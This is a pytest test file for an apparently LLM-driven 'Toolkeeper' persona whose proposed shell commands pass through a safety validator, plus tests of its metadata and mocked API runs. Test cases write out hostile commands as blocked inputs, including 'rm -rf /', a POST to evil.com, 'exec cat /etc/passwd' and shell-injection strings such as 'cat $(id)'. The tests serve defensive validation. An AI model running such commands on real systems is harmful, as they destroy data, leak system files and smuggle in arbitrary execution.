"""Tests for the Toolkeeper persona."""

import json
import pytest
from unittest.mock import MagicMock
from tools.personas.toolkeeper import Toolkeeper, _is_safe_command, _run_command
from tools.pipeline import TurnContext


@pytest.fixture
def toolkeeper():
    return Toolkeeper()


# --- Safety checks ---


def test_safe_commands():
    assert _is_safe_command("cat src/index.ts") is True
    assert _is_safe_command("grep -r 'follows' supabase/migrations/") is True
    assert _is_safe_command("git log --oneline -10") is True
    assert _is_safe_command("ls -la src/services/") is True
    assert _is_safe_command("head -50 package.json") is True
    assert _is_safe_command("psql -c 'SELECT * FROM users LIMIT 5'") is True


def test_dangerous_commands_blocked():
    assert _is_safe_command("rm -rf /") is False
    assert _is_safe_command("git push origin main") is False
    assert _is_safe_command("git commit -m 'test'") is False
    assert _is_safe_command("npm install express") is False
    assert _is_safe_command("pip install requests") is False
    assert _is_safe_command("echo 'test' > file.txt") is False
    assert _is_safe_command("mv old.py new.py") is False
    assert _is_safe_command("curl -X POST https://evil.com") is False


def test_shell_injection_blocked():
    """Shell injection vectors via subshell, backtick, process substitution."""
    assert _is_safe_command("cat $(id)") is False
    assert _is_safe_command("cat `id`") is False
    assert _is_safe_command("cat <(id)") is False
    assert _is_safe_command('awk "BEGIN{system(\\"id\\")}"') is False
    assert _is_safe_command("sed -i s/foo/bar/ file.txt") is False
    assert _is_safe_command("cat file | sh") is False
    assert _is_safe_command("cat file | bash") is False
    assert _is_safe_command("eval 'rm -rf /'") is False
    assert _is_safe_command("exec cat /etc/passwd") is False
    assert _is_safe_command("source ~/.bashrc") is False


def test_psql_requires_c_flag():
    """psql without -c is interactive — blocked."""
    assert _is_safe_command("psql mydb") is False
    assert _is_safe_command("psql -c 'SELECT 1'") is True


def test_git_only_safe_subcommands():
    assert _is_safe_command("git log") is True
    assert _is_safe_command("git diff HEAD~1") is True
    assert _is_safe_command("git status") is True
    assert _is_safe_command("git reset --hard") is False
    assert _is_safe_command("git checkout -- .") is False
    assert _is_safe_command("git merge feature") is False


# --- Persona metadata ---


def test_toolkeeper_metadata(toolkeeper):
    assert toolkeeper.name == "toolkeeper"
    assert toolkeeper.model == "haiku"
    assert "observer" in toolkeeper.reads
    assert "token_cart" in toolkeeper.reads


def test_toolkeeper_activates_moderate_complex(toolkeeper):
    ctx = TurnContext()
    assert toolkeeper.should_activate("simple", ctx) is False
    assert toolkeeper.should_activate("moderate", ctx) is True
    assert toolkeeper.should_activate("complex", ctx) is True


# --- Command execution ---


def test_run_command_safe(tmp_path):
    """Safe command runs and returns output."""
    test_file = tmp_path / "test.txt"
    test_file.write_text("hello world")
    output = _run_command(f"cat {test_file}", str(tmp_path))
    assert "hello world" in output


def test_run_command_blocked():
    """Dangerous command is blocked."""
    output = _run_command("rm -rf /tmp/test", "/tmp")
    assert "BLOCKED" in output


def test_run_command_timeout():
    """Command that takes too long times out."""
    # Use find on root with no depth limit — safe command that will timeout
    output = _run_command("find / -name '*.nonexistent_extension_xyz' 2>/dev/null", "/tmp")
    # May timeout or return empty — either is acceptable
    assert output is not None


# --- Run with mocked Haiku ---


def test_toolkeeper_no_tools_needed(toolkeeper, monkeypatch):
    output = {"needs_tools": False, "commands": [], "reasoning": "context sufficient"}
    mock_msg = MagicMock()
    mock_msg.content = [MagicMock(text=json.dumps(output))]
    mock_msg.usage = MagicMock(input_tokens=30, output_tokens=20)
    monkeypatch.setattr(toolkeeper, "_call_api", lambda s, u, m, mt: mock_msg)

    result = toolkeeper.run({
        "observer": {"summary": "Hello"},
        "token_cart": {"enriched_prompt": "Hello", "handoff": ""},
    })
    assert result["needs_tools"] is False


def test_toolkeeper_preserves_usage(toolkeeper, monkeypatch):
    """Toolkeeper run() must forward _usage from the underlying API call."""
    output = {"needs_tools": False, "commands": [], "reasoning": "context sufficient"}
    mock_msg = MagicMock()
    mock_msg.content = [MagicMock(text=json.dumps(output))]
    mock_msg.usage = MagicMock(input_tokens=42, output_tokens=18)
    monkeypatch.setattr(toolkeeper, "_call_api", lambda s, u, m, mt: mock_msg)

    result = toolkeeper.run({
        "observer": {"summary": "Hello"},
        "token_cart": {"enriched_prompt": "Hello", "handoff": ""},
    })
    assert result["_usage"]["input_tokens"] == 42
    assert result["_usage"]["output_tokens"] == 18


def test_toolkeeper_executes_safe_commands(toolkeeper, monkeypatch, tmp_path):
    # Create a test file
    test_file = tmp_path / "service.ts"
    test_file.write_text("export function follow() {}")

    output = {
        "needs_tools": True,
        "commands": [f"cat {test_file}"],
        "reasoning": "need to read service file",
    }
    mock_msg = MagicMock()
    mock_msg.content = [MagicMock(text=json.dumps(output))]
    mock_msg.usage = MagicMock(input_tokens=30, output_tokens=20)
    monkeypatch.setattr(toolkeeper, "_call_api", lambda s, u, m, mt: mock_msg)

    result = toolkeeper.run({
        "observer": {"summary": "show me the follow service"},
        "token_cart": {"enriched_prompt": "show follow service", "handoff": ""},
        "_project_path": str(tmp_path),
    })
    assert result["needs_tools"] is True
    assert "export function follow" in result["output"]
    assert len(result["commands_run"]) == 1
